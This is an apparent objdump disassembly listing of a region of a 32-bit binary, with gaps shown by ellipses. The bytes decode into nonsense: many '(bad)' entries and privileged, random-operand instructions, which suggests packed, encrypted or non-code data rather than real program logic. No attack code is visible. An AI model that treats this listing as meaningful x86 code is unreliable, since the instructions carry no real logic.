  41c65a:	xlat   BYTE PTR ds:[ebx]
  41c65b:	jns    0x41c69c
  41c65d:	or     esp,DWORD PTR [edi-0x363d5d2b]
  41c663:	mov    bl,0x5e
  41c665:	call   0x3982dc3a
  41c66a:	shl    BYTE PTR [edx],cl
  41c66c:	cmp    cl,BYTE PTR ds:0x5b350ccf
  41c672:	mov    ah,0xc9
  41c674:	fcmovbe st,st(1)
  41c676:	adc    eax,0xd7f52a7c
  41c67b:	mov    eax,0x4a5bc209
  41c680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c681:	idiv   esp
  41c683:	dec    ecx
  41c684:	scas   eax,DWORD PTR es:[edi]
  41c685:	dec    eax
  41c686:	push   es
  41c687:	push   ebp
  41c688:	ja     0x41c679
  41c68a:	ror    BYTE PTR [ecx-0x58d3936],cl
  41c690:	fldenv [eax]
  41c692:	mov    bh,0xe4
  41c694:	fmul   QWORD PTR [edi]
  41c696:	loop   0x41c6c3
  41c698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c699:	mov    DWORD PTR [edi],edx
  41c69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c69c:	mov    edx,0xa1fd4208
  41c6a1:	loopne 0x41c6f5
  41c6a3:	nop
  41c6a4:	cmp    al,0x2a
  41c6a6:	xchg   DWORD PTR [ecx],edx
  41c6a8:	or     eax,0x6ea5c286
  41c6ad:	in     al,dx
  41c6ae:	int    0x34
  41c6b0:	cmp    esp,0xaeeb96
	...
  41c716:	fiadd  DWORD PTR [ecx]
  41c718:	ret    0xdb86
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	fld    DWORD PTR [eax-0x6e]
  41c725:	jno    0x41c791
  41c727:	sub    al,0x1
  41c729:	add    BYTE PTR [edi],al
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [eax-0x8da7c61],dl
  41c733:	fisub  DWORD PTR [edi-0x65a1df54]
  41c739:	js     0x41c7aa
  41c73b:	std    
  41c73c:	and    DWORD PTR [esi],esp
  41c73e:	or     DWORD PTR [ebp-0x5359550a],esp
  41c744:	ds leave 
  41c746:	stc    
  41c747:	sbb    esi,DWORD PTR [ebx]
  41c749:	gs sbb al,0xde
  41c74c:	or     al,BYTE PTR [eax-0x28fb32ef]
  41c752:	and    BYTE PTR [edi+0x20110208],bh
  41c758:	inc    ecx
  41c759:	push   esi
  41c75a:	cdq    
  41c75b:	loopne 0x41c714
  41c75d:	and    al,0xdb
  41c75f:	(bad)
  41c762:	ja     0x41c7b2
  41c764:	jns    0x41c782
  41c766:	sbb    BYTE PTR [edi+ebp*8-0x116cb4b4],dl
  41c76d:	push   edi
  41c76e:	push   0x2743b6a0
  41c773:	mov    BYTE PTR [ebx+0x60],dl
  41c776:	ret    
  41c777:	xchg   esi,eax
  41c778:	in     al,dx
  41c779:	scas   eax,DWORD PTR es:[edi]
  41c77a:	ds nop
  41c77c:	jecxz  0x41c71c
  41c77e:	jo     0x41c713
  41c780:	add    ebp,ebp
  41c782:	pop    es
  41c783:	setp   al
  41c786:	sbb    eax,edi
  41c788:	iret   
  41c789:	imul   ebp,DWORD PTR [edi],0xfffffff6
  41c78c:	ret    
  41c78d:	mov    eax,ds:0xe082a364
  41c792:	out    dx,al
  41c793:	sbb    al,0x1a
  41c795:	in     eax,0xdb
  41c797:	mov    esi,0x44239f27
  41c79c:	ds mov dl,0x1a
  41c79f:	mov    BYTE PTR [ecx+0x5e5d5279],ah
  41c7a5:	xor    eax,0xd138df27
  41c7aa:	xchg   ecx,eax
  41c7ab:	push   cs
  41c7ac:	pop    edx
  41c7ad:	es push esp
  41c7af:	je     0x41c82a
  41c7b1:	es pop eax
  41c7b3:	xchg   DWORD PTR [ebp+0x2f],esi
  41c7b6:	sar    DWORD PTR ds:0x2066eb2e,cl
  41c7bc:	daa    
  41c7bd:	xchg   ebx,eax
  41c7be:	mov    ebp,0xdaa503bf
  41c7c3:	test   DWORD PTR [edx+eiz*8+0x14959750],ebx
  41c7ca:	and    DWORD PTR [edi-0x3f],0xf231cf31
  41c7d1:	pop    esi
  41c7d2:	hlt    
  41c7d3:	data16 jp 0x41c7a9
  41c7d6:	mov    al,ds:0xb722fb3c
  41c7db:	and    dl,bh
  41c7dd:	ins    DWORD PTR es:[edi],dx
  41c7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7df:	call   0x5f53:0xa865b3a9
  41c7e6:	mov    esp,0xec2d0e59
  41c7eb:	push   edi
  41c7ec:	adc    eax,0xfa657f12
  41c7f1:	pop    ss
  41c7f2:	adc    eax,0x7dee6550
  41c7f7:	push   cs
  41c7f8:	xor    ah,BYTE PTR [ecx+0x792faa50]
  41c7fe:	mov    ds:0xde63b8e8,eax
  41c803:	mov    ebp,esp
  41c805:	mov    bl,0x94
  41c807:	jle    0x41c84d
  41c809:	mov    eax,ds:0xc7d730bf
  41c80e:	add    al,0xd6
  41c810:	in     eax,dx
  41c811:	push   ebp
  41c812:	outs   dx,BYTE PTR ds:[esi]
  41c813:	jp     0x41c7f2
  41c815:	nop
  41c816:	push   ebp
  41c817:	cmp    edi,esp
  41c819:	pop    ds
  41c81a:	das    
  41c81b:	int3   
  41c81c:	popf   
  41c81d:	enter  0xf324,0x82
  41c821:	mov    ch,0x6a
  41c823:	xor    ebp,DWORD PTR [ebp-0x32af60]
  41c829:	aaa    
  41c82a:	cmp    eax,0x5f4aee2a
  41c82f:	shr    DWORD PTR [edx+edx*4+0xdddb72],cl
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	lods   eax,DWORD PTR ds:[esi]
  41c8a3:	(bad)  
  41c8a4:	jmp    0x700:0x12d71f1
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    BYTE PTR [ebx+0x52346d57],dl
  41c8b3:	aas    
  41c8b4:	push   ss
  41c8b5:	dec    edi
  41c8b6:	xchg   cl,bh
  41c8b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8b9:	lea    esi,[ebp+0x4a]
  41c8bc:	push   es
  41c8bd:	mov    edi,0xa4ff5159
  41c8c2:	add    bl,bl
  41c8c4:	icebp  
  41c8c5:	int    0x13
  41c8c7:	ds (bad) 
  41c8c9:	mov    ds:0x4991fd16,eax
  41c8ce:	pop    esi
  41c8cf:	scas   al,BYTE PTR es:[edi]
  41c8d0:	jp     0x41c913
  41c8d2:	or     al,0xe7
  41c8d4:	dec    edi
  41c8d5:	shl    cl,0xd8
  41c8d8:	jmp    0x41c94b
  41c8da:	test   edx,ebp
  41c8dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8dd:	fcom   QWORD PTR [esi]
  41c8df:	cld    
  41c8e0:	dec    ebx
  41c8e1:	test   ebx,ebp
  41c8e3:	push   ebp
  41c8e4:	gs pop edx
  41c8e6:	mov    bh,0xaf
  41c8e8:	fsub   QWORD PTR [ebx-0xedb7e33]
  41c8ee:	std    
  41c8ef:	or     al,0x91
  41c8f1:	aas    
  41c8f2:	cmp    al,0x42
  41c8f4:	mov    bl,bl
  41c8f6:	jbe    0x41c8f8
  41c8f8:	retf   
  41c8f9:	xor    dh,al
  41c8fb:	mov    dh,0xea
  41c8fd:	mov    bl,0x18
  41c8ff:	(bad)  
  41c901:	dec    esp
  41c902:	in     eax,0x3e
  41c904:	movntq QWORD PTR [eax-0x50],mm0
  41c908:	or     eax,0x9e6474a1
  41c90d:	add    ecx,DWORD PTR [edi-0x77427dbd]
  41c913:	scas   eax,DWORD PTR es:[edi]
  41c914:	pop    edi
  41c915:	jle    0x41c913
  41c917:	lds    edi,FWORD PTR [eax+edx*2-0x7e601ca8]
  41c91e:	(bad)  
  41c91f:	icebp  
  41c920:	out    dx,eax
  41c921:	inc    eax
  41c922:	(bad)  
  41c924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c925:	jae    0x41c974
  41c927:	push   cs
  41c928:	clc    
  41c929:	mov    edx,0xb7b9e6d6
  41c92e:	pop    ecx
  41c92f:	lea    ecx,[ecx-0x74060759]
  41c935:	sbb    cl,0x14
  41c938:	cmp    edx,eax
  41c93a:	inc    esp
  41c93b:	pop    ecx
  41c93c:	xor    edi,DWORD PTR [ebx+ebp*4-0x21]
  41c940:	cmp    BYTE PTR [ebp-0xf7fb0db],ch
  41c946:	test   BYTE PTR [ebp+0x24],bh
  41c949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c94a:	or     al,0xa8
  41c94c:	sbb    al,BYTE PTR [ebx]
  41c94e:	in     al,0xd3
  41c950:	add    BYTE PTR [esi],dl
  41c952:	inc    ebx
  41c953:	dec    esp
  41c954:	fldenv [eax+ebp*8+0x1eeecb3c]
  41c95b:	or     al,0x56
  41c95d:	push   es
  41c95e:	adc    esi,esp
  41c960:	push   ds
  41c961:	dec    edx
  41c962:	push   ebp
  41c963:	ins    BYTE PTR es:[edi],dx
  41c964:	(bad)  
  41c966:	pop    ss
  41c967:	jnp    0x41c983
  41c969:	dec    ecx
  41c96a:	mov    ch,0xfa
  41c96c:	fidivr WORD PTR [ebx]
  41c96e:	sbb    BYTE PTR [edi+0x7f580330],0xbd
  41c975:	mov    eax,ds:0xbda4bd7d
  41c97a:	stos   DWORD PTR es:[edi],eax
  41c97b:	jecxz  0x41c9dd
  41c97d:	repnz ins BYTE PTR es:[edi],dx
  41c97f:	or     eax,0x60250d07
  41c984:	mov    bh,0xde
  41c986:	(bad)  
  41c987:	pop    edi
  41c988:	clc    
  41c989:	mov    eax,ds:0x6ab40dd7
  41c98e:	pop    ebx
  41c98f:	xchg   ebp,eax
  41c990:	outs   dx,DWORD PTR ds:[esi]
  41c991:	jge    0x41c9d2
  41c993:	xchg   esi,eax
  41c994:	xlat   BYTE PTR ds:[ebx]
  41c995:	idiv   DWORD PTR [ebx]
  41c997:	call   0x604e:0x9397c320
  41c99e:	sti    
  41c99f:	push   es
  41c9a0:	or     BYTE PTR [ecx],cl
  41c9a2:	mov    cl,0x4c
  41c9a4:	sahf   
  41c9a5:	xchg   DWORD PTR cs:[edi+0x42],edi
  41c9a9:	arpl   bp,dx
  41c9ab:	vmptrld QWORD PTR [ecx]
  41c9ae:	nop
  41c9af:	push   ebp
  41c9b0:	adc    BYTE PTR [ecx+0x5dd220],ah
	...
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x9ab333fe
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [eax-0x1c],bl
  41ca30:	inc    edx
  41ca31:	and    eax,0xc7e9b90d
  41ca36:	(bad)  
  41ca37:	shl    DWORD PTR [esi-0x51],1
  41ca3a:	push   eax
  41ca3b:	push   cs
  41ca3c:	mov    esp,0xc52af0a4
  41ca41:	shr    DWORD PTR ds:0xc656e71a,cl
  41ca47:	xor    eax,0x47733ca7
  41ca4c:	xchg   dh,dh
  41ca4e:	enter  0x45a1,0x2
  41ca52:	test   DWORD PTR [edi],ecx
  41ca54:	lahf   
  41ca55:	and    al,0xe3
  41ca57:	sbb    dh,ah
  41ca59:	sbb    eax,0x2d33e3d2
  41ca5e:	jmp    0x7b9f:0xec93ad0e
  41ca65:	cmp    BYTE PTR [eax-0x553cdaeb],bl
  41ca6b:	or     DWORD PTR [ebx],esi
  41ca6d:	sahf   
  41ca6e:	fisttp DWORD PTR [ecx-0x3dac148a]
  41ca74:	int3   
  41ca75:	ret    0x48b1
  41ca78:	in     eax,dx
  41ca79:	jg     0x41ca8e
  41ca7b:	xor    eax,0x62b32305
  41ca80:	push   edx
  41ca81:	jnp    0x41cb02
  41ca83:	pushf  
  41ca84:	lock dec edx
  41ca86:	sbb    DWORD PTR [ebp+0x40],ebp
  41ca89:	cli    
  41ca8a:	inc    edx
  41ca8b:	or     eax,edi
  41ca8d:	xor    BYTE PTR [ecx],bh
  41ca8f:	sbb    al,0xfb
  41ca91:	inc    ebx
  41ca92:	jg     0x41caff
  41ca94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca95:	and    DWORD PTR [edx-0x530beaf9],edi
  41ca9b:	(bad)  
  41ca9c:	jmp    0xa6e856f0
  41caa1:	lock or eax,DWORD PTR [ebx+0x25]
  41caa5:	pop    ds
  41caa6:	(bad)  
  41caa7:	dec    DWORD PTR [ecx]
  41caa9:	(bad)  
  41caaa:	imul   BYTE PTR [ecx+0x76]
  41caad:	xor    eax,0xe2c578b3
  41cab2:	jnp    0x41ca75
  41cab4:	cdq    
  41cab5:	or     edx,DWORD PTR [ebx-0x29]
  41cab8:	inc    esi
  41cab9:	and    BYTE PTR [ecx-0x42],0x6c
  41cabd:	imul   edi,esp,0xffffffbd
  41cac0:	ss (bad) 
  41cac2:	cld    
  41cac3:	test   esp,0xda9dd579
  41cac9:	mov    ebx,0x792ef471
  41cace:	or     cl,BYTE PTR [esi+ecx*4+0x7]
  41cad2:	std    
  41cad3:	pop    esp
  41cad4:	dec    esp
  41cad5:	inc    edx
  41cad6:	push   esp
  41cad7:	pop    ecx
  41cad8:	mov    ds:0xdad530ae,al
  41cadd:	and    dh,0xba
  41cae0:	push   edi
  41cae1:	je     0x41cad1
  41cae3:	call   0xdab1b9d7
  41cae8:	test   al,0x13
  41caea:	mov    bl,0xa0
  41caec:	mov    ebx,0x6a66dda6
  41caf1:	jno    0x41cad4
  41caf3:	(bad)  
  41caf4:	push   ebx
  41caf5:	jle    0x41cb18
  41caf7:	mov    eax,0xf964dadd
  41cafc:	dec    ebp
  41cafd:	add    eax,0xd654909c
  41cb02:	in     eax,0x37
  41cb04:	jecxz  0x41cb14
  41cb06:	push   edx
  41cb07:	dec    ebx
  41cb08:	push   edx
  41cb09:	mov    ah,0x84
  41cb0b:	ret    
  41cb0c:	dec    esp
  41cb0d:	test   DWORD PTR [edx+0x1eb43da5],esi
  41cb13:	cmp    DWORD PTR [eax],eax
  41cb15:	adc    BYTE PTR [edx+0x64],0xa2
  41cb19:	popf   
  41cb1a:	in     eax,0x79
  41cb1c:	outs   dx,BYTE PTR ds:[esi]
  41cb1d:	mov    dh,0x1c
  41cb1f:	xor    edi,DWORD PTR [edx]
  41cb21:	inc    eax
  41cb22:	xchg   ebp,eax
  41cb23:	sub    eax,0xc254d0e9
  41cb28:	jle    0x41cb9c
  41cb2a:	mov    ch,BYTE PTR [eax+eax*8]
  41cb2d:	pop    ecx
  41cb2e:	or     DWORD PTR [esi+0x3a1aebf5],esp
  41cb34:	or     al,BYTE PTR [eax]
	...
  41cb96:	sub    esi,edx
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi+0x60c23c4c]
  41cba3:	popf   
  41cba4:	adc    ebx,DWORD PTR [edx+0x12f7f]
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [eax-0x4502f35f],dh
  41cbb3:	mov    eax,ds:0x2e7c46c6
  41cbb8:	test   eax,0xccd385e5
  41cbbd:	arpl   sp,di
  41cbbf:	lea    ebx,[edx]
  41cbc1:	out    0xdb,eax
  41cbc3:	xor    ebx,ebx
  41cbc5:	add    cl,BYTE PTR [edi]
  41cbc7:	mov    ds:0xc12181a9,eax
  41cbcc:	mov    ss,WORD PTR [edi-0x74]
  41cbcf:	fistp  WORD PTR [edi]
  41cbd1:	test   DWORD PTR [ecx],ebp
  41cbd3:	jb     0x41cbb5
  41cbd5:	jl     0x41cb8c
  41cbd7:	add    eax,0x1acbbcaa
  41cbdc:	mov    al,0x2c
  41cbde:	jle    0x41cc4b
  41cbe0:	xchg   esi,eax
  41cbe1:	xlat   BYTE PTR ds:[ebx]
  41cbe2:	jne    0x41cb9a
  41cbe4:	sub    cl,dh
  41cbe6:	and    WORD PTR [edx-0x24],bx
  41cbea:	or     edx,0x67
  41cbed:	xor    eax,0xd45f8394
  41cbf2:	push   ds
  41cbf3:	mov    BYTE PTR [ebx],cl
  41cbf5:	mov    ah,0x0
  41cbf7:	cli    
  41cbf8:	pop    ss
  41cbf9:	sti    
  41cbfa:	shl    DWORD PTR [eax],0x1c
  41cbfd:	popf   
  41cbfe:	lahf   
  41cbff:	pusha  
  41cc00:	jl     0x41cc78
  41cc02:	dec    esi
  41cc03:	inc    esp
  41cc04:	jl     0x41cc4a
  41cc06:	frndint 
  41cc08:	sub    BYTE PTR [ecx+0x64],dl
  41cc0b:	or     BYTE PTR [ebx],bh
  41cc0d:	pop    ds
  41cc0e:	int3   
  41cc0f:	(bad)  
  41cc10:	jb     0x41cc38
  41cc12:	imul   edi,DWORD PTR [ecx],0xffffffd4
  41cc15:	sqrtps xmm7,XMMWORD PTR ds:0x9bd3b3ac
  41cc1c:	mul    BYTE PTR [edx-0x2b]
  41cc1f:	pop    es
  41cc20:	popf   
  41cc21:	sub    al,0xbb
  41cc23:	jle    0x41cc2e
  41cc25:	js     0x41cc50
  41cc27:	mov    ds:0xbae6b27f,eax
  41cc2c:	pop    esp
  41cc2d:	push   ss
  41cc2e:	hlt    
  41cc2f:	test   al,0x65
  41cc31:	pop    ebx
  41cc32:	popa   
  41cc33:	and    dh,ah
  41cc35:	enter  0xcdc7,0xe6
  41cc39:	or     ah,BYTE PTR [esi-0xf]
  41cc3c:	jmp    FWORD PTR [esi]
  41cc3e:	frndint 
  41cc40:	sbb    BYTE PTR [ecx-0x59ffe72e],al
  41cc46:	mov    dl,0x95
  41cc48:	ja     0x41cc02
  41cc4a:	fcomp  QWORD PTR [eax-0x45]
  41cc4d:	sbb    BYTE PTR [esi-0x5b9da9d5],0x7c
  41cc54:	imul   ecx,esp,0x16
  41cc57:	fcomp  st(0)
  41cc59:	pop    ebx
  41cc5a:	pop    ebx
  41cc5b:	retf   
  41cc5c:	and    DWORD PTR [ecx],ebx
  41cc5e:	push   esp
  41cc5f:	jg     0x41cc77
  41cc61:	out    0x15,al
  41cc63:	out    dx,al
  41cc64:	scas   eax,DWORD PTR es:[edi]
  41cc65:	lods   eax,DWORD PTR ds:[esi]
  41cc66:	ds or  eax,0x68b3d04d
  41cc6c:	xchg   esp,eax
  41cc6d:	jge    0x41cc51
  41cc6f:	inc    ebp
  41cc70:	inc    edx
  41cc71:	icebp  
  41cc72:	push   ebx
  41cc73:	sub    al,0xd9
  41cc75:	sti    
  41cc76:	cmp    bh,BYTE PTR [esi+0x4b]
  41cc79:	push   0xfeb5ac70
  41cc7e:	push   ebx
  41cc7f:	dec    edi
  41cc80:	and    eax,0x6b0511f1
  41cc85:	and    edi,DWORD PTR [edx]
  41cc87:	fisub  DWORD PTR [edi-0x5f3f2bba]
  41cc8d:	out    0xf8,eax
  41cc8f:	test   DWORD PTR [ebx],0x5cccb222
  41cc95:	test   bh,ch
  41cc97:	push   edx
  41cc98:	mov    dh,0xba
  41cc9a:	fwait
  41cc9b:	jb     0x41cc5b
  41cc9d:	sahf   
  41cc9e:	pop    ecx
  41cc9f:	hlt    
  41cca0:	push   ebx
  41cca1:	rol    DWORD PTR [ebp-0x64],0xfd
  41cca5:	outs   dx,BYTE PTR ds:[esi]
  41cca6:	inc    ebx
  41cca7:	cmp    BYTE PTR [ebp+0x3af2ab91],bl
  41ccad:	and    ch,BYTE PTR ds:0x1e7dc5e9
  41ccb3:	test   al,0xfa
	...
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	(bad)  
  41cd23:	cwde   
  41cd24:	or     esi,ebx
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    bl,cl
  41cd2f:	sbb    BYTE PTR [edi-0x41],ch
  41cd32:	aas    
  41cd33:	mov    eax,0xfcfe1ea0
  41cd38:	jmp    0xd635:0xb2679151
  41cd3f:	xlat   BYTE PTR ds:[ebx]
  41cd40:	jne    0x41cd87
  41cd42:	and    ch,bh
  41cd44:	sub    bh,BYTE PTR [ecx]
  41cd46:	scas   eax,DWORD PTR es:[edi]
  41cd47:	or     DWORD PTR [esi-0x3bc49e70],edx
  41cd4d:	pop    eax
  41cd4e:	pushf  
  41cd4f:	and    ecx,ebp
  41cd51:	xor    ah,bh
  41cd53:	and    cl,BYTE PTR [esi+ecx*1+0x2ffef90f]
  41cd5a:	xchg   ebp,eax
  41cd5b:	push   cs
  41cd5c:	and    eax,ebp
  41cd5e:	test   al,0x9c
  41cd60:	fldcw  WORD PTR ds:0xccec56a8
  41cd66:	add    cl,BYTE PTR [edx-0x6e]
  41cd69:	dec    ecx
  41cd6a:	inc    ecx
  41cd6b:	sub    eax,esp
  41cd6d:	int3   
  41cd6e:	iret   
  41cd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd70:	pop    esp
  41cd71:	adc    eax,0xcbe4dbbf
  41cd76:	popf   
  41cd77:	fwait
  41cd78:	sbb    BYTE PTR [eax+0x27558e3a],dh
  41cd7e:	ins    DWORD PTR es:[edi],dx
  41cd7f:	push   ebp
  41cd80:	shl    DWORD PTR [ecx+0x1ca773b6],0xb2
  41cd87:	jmp    0x41cdaa
  41cd89:	clc    
  41cd8a:	dec    edx
  41cd8b:	mov    al,ds:0x2b8529ff
  41cd90:	push   edx
  41cd91:	pop    es
  41cd92:	mov    edi,0xf2961555
  41cd97:	push   eax
  41cd98:	xchg   ecx,eax
  41cd99:	into   
  41cd9a:	and    BYTE PTR [edi-0x1d],ah
  41cd9d:	pop    esp
  41cd9e:	jle    0x41cd2d
  41cda0:	cmp    eax,0x21bb4983
  41cda5:	enter  0x5ba1,0x71
  41cda9:	fsubr  st,st(0)
  41cdab:	add    bl,BYTE PTR cs:[edx]
  41cdae:	jg     0x41ce27
  41cdb0:	inc    ebx
  41cdb1:	jb     0x41ce07
  41cdb3:	add    edx,DWORD PTR [ebx+0x43]
  41cdb6:	mov    eax,ebx
  41cdb8:	cmp    DWORD PTR [ebx-0x3998d1a],esi
  41cdbe:	repnz aas 
  41cdc0:	mov    eax,ds:0x183461ce
  41cdc5:	cmp    ah,cl
  41cdc7:	dec    eax
  41cdc8:	add    ebx,DWORD PTR [edx-0x3e1439dd]
  41cdce:	add    eax,0x65937289
  41cdd3:	mov    ss,WORD PTR [eax+ecx*2+0x66d2456f]
  41cdda:	push   ecx
  41cddb:	jae    0x41cd98
  41cddd:	shl    DWORD PTR [ecx],cl
  41cddf:	jns    0x41cdec
  41cde1:	in     eax,0x29
  41cde3:	fcmovbe st,st(4)
  41cde5:	ds stos DWORD PTR es:[edi],eax
  41cde7:	(bad)  
  41cde8:	repnz add al,0x7b
  41cdeb:	ret    
  41cdec:	icebp  
  41cded:	cli    
  41cdee:	bnd ja 0x41cd77
  41cdf1:	fcomp  st(0)
  41cdf3:	inc    ebx
  41cdf4:	push   esi
  41cdf5:	push   0xb4502593
  41cdfa:	in     al,dx
  41cdfb:	adc    eax,0x16c5a9c3
  41ce00:	xchg   eax,edi
  41ce02:	aad    0x30
  41ce04:	outs   dx,DWORD PTR ds:[esi]
  41ce05:	mov    dl,0x83
  41ce07:	xchg   edi,eax
  41ce08:	sub    al,0x8e
  41ce0a:	sti    
  41ce0b:	xchg   ebx,eax
  41ce0c:	cmp    dl,cl
  41ce0e:	mov    dl,0x82
  41ce10:	int3   
  41ce11:	and    DWORD PTR [edi+ebp*4+0x50],edi
  41ce15:	scas   eax,DWORD PTR es:[edi]
  41ce16:	jle    0x41ce67
  41ce18:	leave  
  41ce19:	or     eax,0x893bc89a
  41ce1e:	jp     0x41ce31
  41ce20:	jmp    0xa3a1fd40
  41ce25:	fdivrp st(3),st
  41ce27:	push   esi
  41ce28:	push   0xfffffff4
  41ce2a:	int    0x90
  41ce2c:	push   eax
  41ce2d:	mov    ds:0xef2f08ea,eax
  41ce32:	icebp  
  41ce33:	adc    eax,0x49
	...
  41ce94:	add    BYTE PTR [eax],al
  41ce96:	pop    es
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0xc435f1e8
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [ecx],bl
  41ceaf:	mov    dh,BYTE PTR [ebp+0x2b]
  41ceb2:	push   ds
  41ceb3:	test   eax,0xf9db0c34
  41ceb8:	(bad)  
  41ceb9:	jno    0x41ceb6
  41cebb:	stc    
  41cebc:	xchg   BYTE PTR [ebx],ah
  41cebe:	inc    BYTE PTR [edx+0x15e52c39]
  41cec4:	(bad)
  41cec7:	sbb    ecx,ebp
  41cec9:	cmp    BYTE PTR [ebx],ah
  41cecb:	jbe    0x41ce9e
  41cecd:	push   ecx
  41cece:	daa    
  41cecf:	jb     0x41ce90
  41ced1:	mov    dl,0x15
  41ced3:	sub    DWORD PTR [esi],edi
  41ced5:	cmp    al,0x0
  41ced7:	neg    DWORD PTR [edx+0x191eca0d]
  41cedd:	fwait
  41cede:	lahf   
  41cedf:	sbb    cl,ah
  41cee1:	and    dh,BYTE PTR [ecx-0x1f]
  41cee4:	jl     0x41ceeb
  41cee6:	out    0xa3,al
  41cee8:	out    dx,al
  41cee9:	sub    al,0xe7
  41ceeb:	dec    edi
  41ceec:	push   eax
  41ceed:	jbe    0x41cea7
  41ceef:	push   esp
  41cef0:	mov    esi,0xe876fbf0
  41cef5:	into   
  41cef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cef7:	xchg   ebp,eax
  41cef8:	bound  ebp,QWORD PTR [eax+eiz*8-0x3c]
  41cefc:	data16 in al,0x51
  41ceff:	mov    ?,WORD PTR [edi-0x62a838cc]
  41cf05:	scas   eax,DWORD PTR es:[edi]
  41cf06:	in     eax,0x75
  41cf08:	out    dx,eax
  41cf09:	test   edx,ecx
  41cf0b:	jns    0x41cf2a
  41cf0d:	ret    0xf1e5
  41cf10:	test   BYTE PTR ds:0xe51729,bh
  41cf16:	ins    DWORD PTR es:[edi],dx
  41cf17:	push   0xc38a5585
  41cf1c:	inc    edi
  41cf1d:	pop    edi
  41cf1e:	outs   dx,BYTE PTR ss:[esi]
  41cf20:	mov    edi,0x3c18c6c
  41cf25:	in     al,dx
  41cf26:	fdiv   DWORD PTR [edi-0x54]
  41cf29:	in     eax,dx
  41cf2a:	test   bh,bh
  41cf2c:	push   esp
  41cf2d:	pop    eax
  41cf2e:	pop    ebx
  41cf2f:	push   ss
  41cf30:	mov    ?,WORD PTR [edi]
  41cf32:	mov    bh,BYTE PTR [ebx+ebp*4-0x26]
  41cf36:	or     BYTE PTR [esi],al
  41cf38:	jp     0x41cf8b
  41cf3a:	mov    WORD PTR [ecx+0x552199a9],cs
  41cf40:	out    dx,eax
  41cf41:	or     bh,BYTE PTR [ebp-0x1c]
  41cf44:	clc    
  41cf45:	cmp    ebx,DWORD PTR [edi+0x49346771]
  41cf4b:	repnz mov ch,0x6e
  41cf4e:	into   
  41cf4f:	cmp    dh,al
  41cf51:	imul   eax,DWORD PTR [esi-0x61],0xeb05b207
  41cf58:	cli    
  41cf59:	int3   
  41cf5a:	cwde   
  41cf5b:	or     al,0x69
  41cf5d:	je     0x41cfad
  41cf5f:	imul   ebx,edx,0x6a
  41cf62:	xchg   ah,al
  41cf64:	repnz mov al,0x35
  41cf67:	inc    eax
  41cf68:	mov    bl,0xdf
  41cf6a:	push   eax
  41cf6b:	fldenv [ebx+0x38]
  41cf6e:	daa    
  41cf6f:	popa   
  41cf70:	push   0x71
  41cf72:	outs   dx,BYTE PTR ds:[esi]
  41cf73:	pop    eax
  41cf74:	xchg   esi,eax
  41cf75:	sbb    eax,0xb414c7ca
  41cf7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf7b:	sbb    al,0x96
  41cf7d:	(bad)  
  41cf7e:	push   0xfffffff7
  41cf80:	in     al,dx
  41cf81:	loop   0x41cf26
  41cf83:	push   sp
  41cf85:	daa    
  41cf86:	inc    eax
  41cf87:	jnp    0x41cf5e
  41cf89:	popa   
  41cf8a:	mov    ds:0xc57ee44e,al
  41cf8f:	arpl   WORD PTR [edx+esi*8],bp
  41cf92:	jecxz  0x41cf8a
  41cf94:	cmp    eax,0xeac55180
  41cf99:	iret   
  41cf9a:	imul   ebx,DWORD PTR [ecx+0x7b],0xffffff9e
  41cf9e:	cmp    al,0x75
  41cfa0:	cmp    DWORD PTR [ebx-0x467930e2],0x6664b423
  41cfaa:	dec    ebp
  41cfab:	add    al,0xba
  41cfad:	add    BYTE PTR [eax],bl
  41cfaf:	lods   eax,DWORD PTR ds:[esi]
  41cfb0:	stos   BYTE PTR es:[edi],al
  41cfb1:	mov    esp,0x8c4917
	...
  41d016:	mov    ecx,0xad432034
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	push   0x941c3191
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
